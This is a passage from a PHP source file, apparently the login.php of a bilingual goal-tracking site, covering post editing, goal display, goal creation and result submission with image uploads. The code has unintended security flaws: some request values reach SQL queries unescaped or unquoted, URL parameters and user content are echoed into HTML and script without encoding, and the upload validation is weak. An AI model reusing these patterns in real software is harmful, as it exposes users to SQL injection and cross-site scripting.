												mysqli_query($mysql_connection, "INSERT INTO posts (type, userid, goalid, time, content, picture) VALUES ('1', '".$userdata['id']."', '".$goalid."', '".$time."', '$content', 0)");
												$post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE userid = ".$userdata['id']." AND time = ".$time." LIMIT 1 ");
												$post = mysqli_fetch_array($post_query);
											}else
											{
												$target_dir = "uploads/posts/";
												$target_file = $target_dir . basename($_FILES["picture"]["name"]);
												$image_File_Type = pathinfo($target_file,PATHINFO_EXTENSION);
												// Check if image file is an actual image or fake image
												if(getimagesize($_FILES['picture']['tmp_name']) == false) 
												{
													echo $output_no_image;
													break;
												}
												// Check file size
												if ($_FILES['picture']['size'] > 5000000)
												{
													echo $output_too_big;
													break;
												}
												// Allow certain file formats
												if($image_File_Type != "jpg" && $image_File_Type != "png" && $image_File_Type != "jpeg" && $image_File_Type != "JPG" && $image_File_Type != "PNG" && $image_File_Type != "JPEG")
												{
													echo $output_wrong_format;
													break;
												}
												$time = time();
												mysqli_query($mysql_connection, "INSERT INTO posts (type, userid, goalid, time, content, picture) VALUES ('1', '".$userdata['id']."', '".$goalid."', '".$time."', '$content', 1)");
												$post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE userid = ".$userdata['id']." AND time = ".$time." LIMIT 1 ");
												$post = mysqli_fetch_array($post_query);
												// No error, upload file
												move_uploaded_file($_FILES['picture']['tmp_name'], $target_dir."post_".$post['id']."_1.".$image_File_Type);
											}
											for($actionblockiter = 1; $actionblockiter <= 10; $actionblockiter++)
											{
													if(!($_POST['starttime'.$actionblockiter] == $_POST['finishtime'.$actionblockiter]))
													{
														$actionblockid = mysqli_real_escape_string($mysql_connection, $_POST['actionblock'.$actionblockiter]);
														$starttime = mysqli_real_escape_string($mysql_connection,$_POST['starttime'.$actionblockiter]);
														$finishtime = $_POST['finishtime'.$actionblockiter];
														mysqli_query($mysql_connection, "INSERT INTO scheduleblocks (postid, actionblockid, starttime, finishtime) VALUES ('".$post['id']."', '".$actionblockid."', '".$starttime."', '".$finishtime."')");
													}
											}
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$post['id']."'; </script>";
											exit;
											
										}else
										{
											echo $output_no_content;
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'edit_dayreview':
								switch($_GET['language'])
								{
									case 'german':
									$label_actionblock = "Aktionsblock";
									$label_start = "Von";
									$label_end = "Bis";
									$label_content = "Beitrag";
									$label_goal = "Ziel";
									$label_picture = "Bild hinzufügen";
									$input_submit = "Beitrag bearbeiten";
									
									$output_no_blocks = "Du hast noch keinen Aktionsblock für dieses Ziel definiert.";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$a_add_block = "Aktionsblock zum Ziel hinzufügen";
									break;
									
									case 'english':
									$label_actionblock = "Actionblock";
									$label_start = "Started";
									$label_end = "Finished";
									$label_content = "Content";
									$label_goal = "Goal";
									$label_picture = "Add picture";
									$input_submit = "Edit post";
									
									$output_no_blocks = "You have not yet defined an actionblock for this goal.";
									$output_no_post = "There is no such post.";
									$output_not_author = "You are not the author of this goal.";
									$a_add_block = "Add actionblock to goal";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT * FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									if($post['userid'] == $userdata['id'])
									{
										$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = ".$post['goalid']);
										if(mysqli_num_rows($actionblock_query) >= 1)
										{
											echo "<div class=\"block\">";
												echo "<div class=\"innerblock\">";
													echo "<div class=\"schedule\">";
														echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_edit_dayreview&postid=".$post['id']."\" method=\"post\" accept-charset=\"utf-8\">";
															echo "<h><span>".$label_actionblock."</span><span>".$label_start."</span><span>".$label_end."</span></h>";
															$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = ".$post['goalid']);
															$iter = 1;
															while($actionblock = mysqli_fetch_array($actionblock_query))
															{
																$actionblock_array[$iter] = $actionblock;
																$iter++;
															}
															$scheduleblocks_query = mysqli_query($mysql_connection, "SELECT * FROM scheduleblocks WHERE postid = ".$postid);
															$iter = 1;
															while($scheduleblocks = mysqli_fetch_array($scheduleblocks_query))
															{
																echo "<h><select name=\"actionblock".$iter."\" size=\"1\">";
																	for($actionblock_iter = 1; $actionblock_iter <= sizeof($actionblock_array); $actionblock_iter++)
																	{
																		if($scheduleblocks['actionblockid'] == $actionblock_array[$actionblock_iter]['id'])
																		{
																			echo "<option value=\"".$actionblock_array[$actionblock_iter]['id']."\" selected>".$actionblock_array[$actionblock_iter]['name']."</option>";
																		}else
																		{
																			echo "<option value=\"".$actionblock_array[$actionblock_iter]['id']."\">".$actionblock_array[$actionblock_iter]['name']."</option>";
																		}
																	}
																echo "</select>";
																echo "<select name=\"starttime".$iter."\" size=\"1\">";
																$time_midnight = 82800;
																for($timeiter = 0; $timeiter <= 95; $timeiter++)
																{
																	
																	$time = date("H:i",$time_midnight+$timeiter*900);
																	if($scheduleblocks['starttime'] == $time_midnight+$timeiter*900)
																	{
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\" selected>".$time."</option>";
																	}else
																	{
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																	}
																}
																echo "</select>";
																echo "<select name=\"finishtime".$iter."\" size=\"1\">";
																for($timeiter = 0; $timeiter <= 95; $timeiter++)
																{
																	$time = date("H:i",$time_midnight+$timeiter*900);
																	if($scheduleblocks['finishtime'] == $time_midnight+$timeiter*900)
																	{
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\" selected>".$time."</option>";
																	}else
																	{
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																	}
																}
																echo "</select></h>";
																$iter++;
															}
															for($iter = $iter; $iter <= 10; $iter++)
															{
																echo "<h><select name=\"actionblock".$iter."\" size=\"1\">";
																	for($actionblock_iter = 1; $actionblock_iter <= sizeof($actionblock_array); $actionblock_iter++)
																	{
																		echo "<option value=\"".$actionblock_array[$actionblock_iter]['id']."\">".$actionblock_array[$actionblock_iter]['name']."</option>";
																	}
																echo "</select>";
																echo "<select name=\"starttime".$iter."\" size=\"1\">";
																$time_midnight = 82800;
																for($timeiter = 0; $timeiter <= 95; $timeiter++)
																{
																	$time = date("H:i",$time_midnight+$timeiter*900);
																	echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																}
																echo "</select>";
																echo "<select name=\"finishtime".$iter."\" size=\"1\">";
																$time_midnight = 82800;
																for($timeiter = 0; $timeiter <= 95; $timeiter++)
																{
																	$time = date("H:i",$time_midnight+$timeiter*900);
																	echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																}
																echo "</select></h>";
															}
															echo "<h><label>".$label_content."</label>";
															echo "<textarea name=\"content\">".$post['content']."</textarea></h>";
															echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
														echo "</form>";
													echo "</div>";
												echo "</div>";
											echo "</div>";
										}else
										{
											echo $output_no_blocks;
											echo "<br><a href=\"login.php?language=".$_GET['language']."&action=addblock&goalid=".$post['goalid']."\">".$a_add_block."</a>";
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'submit_edit_dayreview':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Beitrag bearbeitet.";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									$output_not_author = "Du bist nicht der Autor dieses Beitrages.";
									$output_no_content = "Bitte fülle das Feld Beitrag aus.";
									break;
									
									case 'english':
									$output_success = "Post edited.";
									$output_no_post = "There is no such post.";
									$output_not_author = "You are not the author of this post.";
									$output_no_content = "Please fill in the content field.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									if($post['userid'] == $userdata['id'])
									{
										if(!empty($_POST['content']))
										{
											$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
											mysqli_query($mysql_connection, "UPDATE posts SET content = '$content' WHERE id = ".$postid);
											mysqli_query($mysql_connection, "DELETE FROM scheduleblocks WHERE postid = ".$postid);
											for($actionblockiter = 1; $actionblockiter <= 10; $actionblockiter++)
											{
													if(!($_POST['starttime'.$actionblockiter] == $_POST['finishtime'.$actionblockiter]))
													{
														$actionblockid = mysqli_real_escape_string($mysql_connection, $_POST['actionblock'.$actionblockiter]);
														$starttime = mysqli_real_escape_string($mysql_connection,$_POST['starttime'.$actionblockiter]);
														$finishtime = $_POST['finishtime'.$actionblockiter];
														mysqli_query($mysql_connection, "INSERT INTO scheduleblocks (postid, actionblockid, starttime, finishtime) VALUES ('".$postid."', '".$actionblockid."', '".$starttime."', '".$finishtime."')");
													}
											}
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$postid."'; </script>";
											exit;
										}else
										{
											echo $output_no_content;
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'goal':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_author = "Autor:";
									$output_title = "Titel:";
									$output_section = "Kategorie:";
									$output_starttime = "Start:";
									$output_finishtime = "Ende:";
									$output_description = "Beschreibung:";
									$output_pictures = "Bilder:";
									$output_block = "Aktionsblock:";
									$output_anonymous = "Anonym";
									$output_block_used = "Block wurde bereits genutzt und kann daher nicht mehr geändert oder gelöscht werden.";
									$a_follow_goal = "Folgen";
									$a_unfollow_goal = "Entfolgen";
									$a_edit_goal = "Bearbeiten";
									$a_delete_goal = "Löschen";
									$a_add_block = "Aktionsblock hinzufügen";
									$a_edit_block = "Bearbeiten";
									$a_delete_block = "Löschen";
									$a_finish_goal = "Veröffentliche Resultate und beende Ziel";
									$a_results = "Resultate";
									$output_sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" , "other" => "Sonstiges" );
									break;
									
									case 'english':
									$output_no_goal = "Goal not found.";
									$output_author = "Author:";
									$output_title = "Name:";
									$output_section = "Section:";
									$output_starttime = "Start:";
									$output_finishtime = "End:";
									$output_description = "Description:";
									$output_pictures = "Pictures:";
									$output_block = "Actionblock:";
									$output_anonymous = "Anonymous";
									$output_block_used = "Block already used and cannot be edited or deleted anymore.";
									$a_follow_goal = "Follow";
									$a_unfollow_goal = "Unfollow";
									$a_edit_goal = "Edit";
									$a_delete_goal = "Delete";
									$a_add_block = "Add actionblock";
									$a_edit_block = "Edit";
									$a_delete_block = "Delete";
									$a_finish_goal = "Publish results and finish goal";
									$a_results = "Results";
									$output_sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" , "other" => "Other" );
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE id=".$goalid." LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=".$goal['id']." AND userid=".$userdata['id']." LIMIT 1");
									if($goal['anonymous'] == 0)
									{
										$author_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id=".$goal['userid']." LIMIT 1");
										$author = mysqli_fetch_array($author_query);
										$goal['author'] = "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$goal['userid']."\">".$author['name']." ".$author['surname']."</a>";
									}else
									{
										$goal['author'] = $output_anonymous;
									}
									echo "<div class=\"block\">";
										echo "<div class=\"innerblock\">";
											echo "<div class=\"goal\">";
												if($goal['userid'] == $userdata['id'])
												{
													echo "<h><b>".$output_author."</b>".$goal['author']."</h>";
													echo "<h><b>".$output_title."</b>".$goal['title']."</h>";
													echo "<h><b>".$output_section."</b>".$output_sections[$goal['section']]."</h>";
													echo "<h><b>".$output_starttime."</b>".date("d.m.Y - H:i", $goal['starttime'])."</h>";
													if($goal['finishtime'] <= time() AND $goal['finishtime'] != 0)
													{
														echo "<h><b>".$output_finishtime."</b>".date("d.m.Y - H:i", $goal['finishtime'])."</h>";
														$finish_goal = "";
													}else
													{
														$finish_goal =  "<a href=\"login.php?language=".$_GET['language']."&action=finish_goal&goalid=".$goalid."\">".$a_finish_goal."</a>";
													}
													$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = $goalid");
													while($actionblock = mysqli_fetch_array($actionblock_query))
													{
														$links = "";
														$schedule_query = mysqli_query($mysql_connection, "SELECT id FROM scheduleblocks WHERE actionblockid = ".$actionblock['id']." LIMIT 1");
														if(mysqli_num_rows($schedule_query) == 0)
														{
															$links = " <a href=\"login.php?language=".$_GET['language']."&action=editblock&blockid=".$actionblock['id']."\">".$a_edit_block."</a> <a href=\"login.php?language=".$_GET['language']."&action=deleteblock&blockid=".$actionblock['id']."\">".$a_delete_block."</a>";
														}
														echo "<h><b>".$output_block."</b>".$actionblock['name'].$links."</h>";
													}
													$goal['description']=str_replace("\n","<br>",$goal['description']);
													echo "<h><b>".$output_description."</b></h><br>".$goal['description'];
													$show_file = "";
													if($picture_file = glob("uploads/goals/goal_".$goal['id']."_*.*"))
													{
														echo "<h><b>".$output_pictures."</b>";
														foreach($picture_file as $picture)
														{
															$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
														}
														echo $show_file."</h>";
													}
													if($goal['finishtime'] <= time() AND $goal['finishtime'] != 0)
													{
														echo "<h><a href=\"login.php?language=".$_GET['language']."&action=results&goalid=".$goal['id']."\">".$a_results."</a></h>";
													}
													echo "<h><a href=\"login.php?language=".$_GET['language']."&action=editgoal&goalid=".$goal['id']."\">".$a_edit_goal."</a><a href=\"login.php?language=".$_GET['language']."&action=delete_goal&goalid=".$goal['id']."\">".$a_delete_goal."</a><a href=\"login.php?language=".$_GET['language']."&action=addblock&goalid=".$goal['id']."\">".$a_add_block."</a></h>";
													echo "<h>".$finish_goal."</h>";
												}else
												{
													echo "<h><b>".$output_author."</b>".$goal['author']."</h>";
													echo "<h><b>".$output_title."</b>".$goal['title']."</h>";
													echo "<h><b>".$output_section."</b>".$output_sections[$goal['section']]."</h>";
													echo "<h><b>".$output_starttime."</b>".date("d.m.Y - H:i", $goal['starttime'])."</h>";
													if($goal['finishtime'] <= time() AND $goal['finishtime'] != 0)
													{
														echo "<h><b>".$output_finishtime."</b>".date("d.m.Y - H:i", $goal['finishtime'])."</h>";
													}
													$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = $goalid");
													while($actionblock = mysqli_fetch_array($actionblock_query))
													{
														echo "<h><b>".$output_block."</b>".$actionblock['name']."</h>";
													}
													$goal['description']=str_replace("\n","<br>",$goal['description']);
													echo "<h><b>".$output_description."</b></h><br>".$goal['description'];
													$show_file = "";
													if($picture_file = glob("uploads/goals/goal_".$goal['id']."_*.*"))
													{
														echo "<h><b>".$output_pictures."</b>";
														foreach($picture_file as $picture)
														{
															$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
														}
														echo $show_file."</h>";
													}
													echo "<h>";
													if($goal['finishtime'] <= time() AND $goal['finishtime'] != 0)
													{
														echo "<a href=\"login.php?language=".$_GET['language']."&action=results&goalid=".$goal['id']."\">".$a_results."</a>";
													}
													if(mysqli_num_rows($check_following_query))
													{
														echo "<a href=\"login.php?language=".$_GET['language']."&action=unfollowgoal&goalid=".$goal['id']."\">".$a_unfollow_goal."</a>";
													}else
													{
														echo "<a href=\"login.php?language=".$_GET['language']."&action=followgoal&goalid=".$goal['id']."\">".$a_follow_goal."</a>";
													}
													echo "</h>";
												}
											echo "</div>";
								}else{
									echo $output_no_goal;
								}
								break;
								
								case 'results':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_title = "Resultate";
									break;
									
									case 'english':
									$output_no_goal = "There is no such goal";
									$output_title = "Results";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT title FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									$result_query = mysqli_query($mysql_connection, "SELECT * FROM results WHERE goalid=".$goalid." LIMIT 1");
									$result = mysqli_fetch_array($result_query);
									$show_file = "";
									if($result['picture'])
									{		
										if($picture_file = glob("uploads/results/result_".$goalid."_*.*"))
										{
											foreach($picture_file as $picture)
											{
												$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
											}
										}
									}
									echo "<div class=\"block\">";
										echo "<div class=\"feed\">";
											echo "<div class=\"header\">";
												echo "<div class=\"time\">";
													echo date("d.m.Y - H:i", $result['time']);
												echo "</div>";
												echo "<div class=\"title\">";
													echo $output_title.": <a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goalid."\">".$goal['title']."</a>";
												echo "</div>";
											echo "</div>";
											echo "<div class=\"content\">";
												echo "<div class=\"picture\">";
													echo $show_file;
												echo "</div>";
												echo "<div class=\"post\">";
													echo "<div class=\"text\">";
														$result['text']=str_replace("\n","<br>",$result['text']);
														echo $result['text'];
													echo "</div>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
									echo "</div>";
									
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'definegoal':
								switch($_GET['language'])
								{
										case 'german':
										$output_help_actionblocks = "Actionblöcke definieren womit du deine Zeit verbringst. Zum Beispiel: Wenn du auf eine Prüfung lernst und Montags jeweils 4h Hausaufgaben löst und Dienstags jeweils 2h ein Unterrichtsbuch liest und 3h alles repetierst, nutzt du die Aktionsblöcke 'Hausaufgaben lösen', 'Unterrichtsbuch lesen' und 'Stoff repetieren'. Mit Aktionsblöcken kannst du deinen Tagesablauf in einem Stundenplan veröffentlichen. Du kannst das jetzt auch auslassen und später Aktionsblöcke zu deinem Ziel hinzufügen.";
										$label_anonymous = "Anonym posten?";
										$label_title = "Titel";
										$label_section = "Kategorie";
										$label_description = "Beschreibung";
										$label_block = "Aktionsblock";
										$label_picture = "Bilder hinzufügen";
										$option_yes = "Ja";
										$option_no = "Nein";
										$input_submit = "Los gehts!";
										$output_sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" , "other" => "Sonstiges" );
										break;
										
										case 'english':
										$output_help_actionblocks = "Actionblocks define how you spend your time. For example if you study for an exam: On Mondays you invest 4h in doing homework, on Tuesdays you read the textbook for 2h and check the course material for 3h. Thus, you use the actionblocks 'do homework', 'read textbook' and 'check course material'. With actionblocks you can post your daily schedule. You can ignore that for now if you want and add them later to your goal";
										$label_anonymous = "Post anonymously?";
										$label_title = "Title";
										$label_section = "Section";
										$label_description = "Description";
										$label_block = "Actionblock";
										$label_picture = "Add pictures";
										$option_yes = "Yes";
										$option_no = "No";
										$input_submit = "Let's go!";
										$output_sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" , "other" => "Other" );
										break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<form action=\"login.php?language=".$_GET['language']."&action=submitgoal\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\">";
											echo "<div>".$label_title." <input name=\"title\"></input></div>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_anonymous."</label>";
											echo "<span><select name=\"anonymous\" size=\"1\">";
												echo "<option value=\"0\">".$option_no."</option>";
												echo "<option value=\"1\">".$option_yes."</option>";
											echo "</select></span>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_section."</label>";
											echo "<span><select name=\"section\" size=\"1\">";
												foreach($output_sections as $section=>$section_output)
												{
													echo "<option value=\"".$section."\">".$section_output."</option>";
												}
											echo "</select></span>";
											echo "<div class=\"clear\"></div>";
											$goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE userid = ".$userdata['id']." LIMIT 1");
											if(!mysqli_num_rows($goal_query))
											{
												echo "<br>".$output_help_actionblocks."<br><br>";
											}
											for($blocknumber = 1; $blocknumber <= 10; $blocknumber++)
											{
												echo "<label>".$label_block." ".$blocknumber."</label>";
												echo "<input name=\"block".$blocknumber."\"></input>";
												echo "<div class=\"clear\"></div>";
											}
											echo "<br><label>".$label_description."</label>";
											echo "<textarea name=\"description\"></textarea>";
											echo "<div class=\"clear\"></div>";
											echo "<br><br>";
											echo $label_picture;
											for($iter = 1; $iter <= 5; $iter++)
											{
												echo "<p><input type=\"file\" name=\"picture".$iter."\"></input></p>";
											}
											echo "<br>";
											echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
										echo "</form>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'submitgoal':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Ziel gestartet. Viel Erfolg.";
									$output_fail = "Bitte alle Felder ausfüllen.";
									$output_no_image = "Die ausgewählte Datei ist kein Bild.";
									$output_too_big = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
									$output_wrong_format = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
									break;
									
									case 'english':
									$output_success = "Goal started. We wish you success.";
									$output_fail = "Please fill in all fields.";
									$output_no_image = "The chosen file is not an image.";
									$output_too_big = "The chosen file is too big. Maximum size: 5Mb.";
									$output_wrong_format = "Only JPG, JPEG and PNG files are allowed.";
									break;
								}
								if(empty($_POST['title']) OR empty($_POST['description']))
								{
									echo $output_fail;
								}else
								{
									$anonymous = mysqli_real_escape_string($mysql_connection, $_POST['anonymous']);
									$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
									$section = mysqli_real_escape_string($mysql_connection, $_POST['section']);
									$description = mysqli_real_escape_string($mysql_connection, $_POST['description']);
									mysqli_query($mysql_connection, "INSERT INTO goals (userid, anonymous, starttime, title, description, section) VALUES ('".$userdata['id']."', '".$anonymous."', '".time()."','$title','$description', '$section')");
									$goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE userid = ".$userdata['id']." AND title = '".$title."'");
									$goal = mysqli_fetch_array($goal_query);
									for($blocknumber = 1; $blocknumber <= 10; $blocknumber++)
									{
										$blockname = "block".$blocknumber;
										$block[$blocknumber] = mysqli_real_escape_string($mysql_connection, $_POST[$blockname]);
										if(!(empty($block[$blocknumber])))
										{
											mysqli_query($mysql_connection, "INSERT INTO actionblocks (goalid, name) VALUES (".$goal['id'].", '".$block[$blocknumber]."')");
										}
									}
									$target_dir = "uploads/goals/";
									for($iter = 1; $iter <= 5; $iter++)
									{
										$picture_name = "picture".$iter;
										if(!empty($_FILES[$picture_name]['tmp_name']))
										{
											$target_file[$iter] = $target_dir . basename($_FILES[$picture_name]["name"]);
											$image_File_Type[$iter] = pathinfo($target_file[$iter],PATHINFO_EXTENSION);
											$image_check[$iter] = 1;
											// Check if image file is an actual image or fake image
											if(getimagesize($_FILES[$picture_name]['tmp_name']) == false) 
											{
												echo $output_no_image;
												break;
											}
											// Check file size
											if ($_FILES[$picture_name]['size'] > 5000000)
											{
												echo $output_too_big;
												break;
											}
											// Allow certain file formats
											if($image_File_Type[$iter] != "jpg" && $image_File_Type[$iter] != "png" && $image_File_Type[$iter] != "jpeg" && $image_File_Type[$iter] != "JPG" && $image_File_Type[$iter] != "PNG" && $image_File_Type[$iter] != "JPEG")
											{
												echo $output_wrong_format;
												break;
											}
										}else
										{
											$image_check[$iter] = 0;
										}
									}
									// No error, upload file
									for($iter = 1; $iter <= 5; $iter++)
									{
										if($image_check[$iter])
										{
											$picture_name = "picture".$iter;
											move_uploaded_file($_FILES[$picture_name]['tmp_name'], $target_dir."goal_".$goal['id']."_".$iter.".".$image_File_Type[$iter]);
										}
									}
									echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$goal['id']."'; </script>";
									exit;
								}
								break;
								
								case 'finish_goal':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_intro = "Gratuliere zum Abschluss deines Zieles. Bitte fasse hier nochmals deine Resultate zusammen, damit zukünftige Besucher direkt sehen können, was hier erreicht wurde.";
									$label_results = "Resultate:";
									$label_pictures = "Bilder hinzufügen:";
									$input_submit = "Resultate abschicken";
									break;
									
									case 'english':
									$output_no_goal = "There is no such goal.";
									$output_not_author = "You are not the author of this goal.";
									$output_intro = "Congratulations to your end of this goal. Please summarize here again your results such that future visitors can see directly what has have been achieved.";
									$label_results = "Results:";
									$label_pictures = "Add pictures";
									$input_submit = "Submit results";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo $output_intro."<br><br>";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_results&goalid=".$goalid."\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\">";
													echo "<label>".$label_results."</label>";
													echo "<textarea name=\"results\"></textarea>";
													echo "<br><br>";
													echo $label_pictures;
													for($iter = 1; $iter <= 5; $iter++)
													{
														echo "<p><input type=\"file\" name=\"picture".$iter."\"></input></p>";
													}
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'submit_results':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_results = "Bitte fülle das Textfeld mit deinen Resultaten aus.";
									$output_no_image = "Die ausgewählte Datei ist kein Bild.";
									$output_too_big = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
									$output_wrong_format = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
									$output_success = "Ziel erfolgreich abgeschlossen.";
									break;
									
									case 'english':
									$output_no_goal = "There is no such goal.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_results = "Please fill in the text field with your results.";
									$output_no_image = "The chosen file is not an image.";
									$output_too_big = "The chosen file is too big. Maximum size: 5Mb.";
									$output_wrong_format = "Only JPG, JPEG and PNG files are allowed.";
									$output_success = "Goal successfully finished.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										if(empty($_POST['results']))
										{
											echo $output_no_results;
										}else
										{
											mysqli_query($mysql_connection," UPDATE goals SET finishtime = ".time()." WHERE id = ".$goalid);
											$results = mysqli_real_escape_string($mysql_connection, $_POST['results']);
											$time = time();
											// check if file has been chosen
											if(empty($_FILES['picture1']['tmp_name']) AND empty($_FILES['picture2']['tmp_name']) AND empty($_FILES['picture3']['tmp_name']) AND empty($_FILES['picture4']['tmp_name']) AND empty($_FILES['picture5']['tmp_name']))
											{
												mysqli_query($mysql_connection, "INSERT INTO results (userid, goalid, time, text, picture) VALUES ('".$userdata['id']."', '".$goalid."', '".$time."','".$results."', 0)");
												echo $output_success;
											}else
											{
												$target_dir = "uploads/results/";
												for($iter = 1; $iter <= 5; $iter++)
												{
													$picture_name = "picture".$iter;
													if(!empty($_FILES[$picture_name]['tmp_name']))
													{
														$target_file[$iter] = $target_dir . basename($_FILES[$picture_name]["name"]);
														$image_File_Type[$iter] = pathinfo($target_file[$iter],PATHINFO_EXTENSION);
														$image_check[$iter] = 1;
														// Check if image file is an actual image or fake image
														if(getimagesize($_FILES[$picture_name]['tmp_name']) == false) 
														{
															echo $output_no_image;
															break;
														}
														// Check file size
														if ($_FILES[$picture_name]['size'] > 5000000)
														{
															echo $output_too_big;
															break;
														}
														// Allow certain file formats
														if($image_File_Type[$iter] != "jpg" && $image_File_Type[$iter] != "png" && $image_File_Type[$iter] != "jpeg" && $image_File_Type[$iter] != "JPG" && $image_File_Type[$iter] != "PNG" && $image_File_Type[$iter] != "JPEG")
														{
															echo $output_wrong_format;
															break;
														}
													}else
													{
														$image_check[$iter] = 0;
													}
												}
												mysqli_query($mysql_connection, "INSERT INTO results (userid, goalid, time, text, picture) VALUES ('".$userdata['id']."', '".$goalid."', '".$time."','".$results."', 1)");
												$result_query = mysqli_query($mysql_connection, "SELECT id FROM results WHERE goalid = ".$goalid." AND time = ".$time." LIMIT 1");
												$result = mysqli_fetch_array($result_query);
												// No error, upload file
												for($iter = 1; $iter <= 5; $iter++)
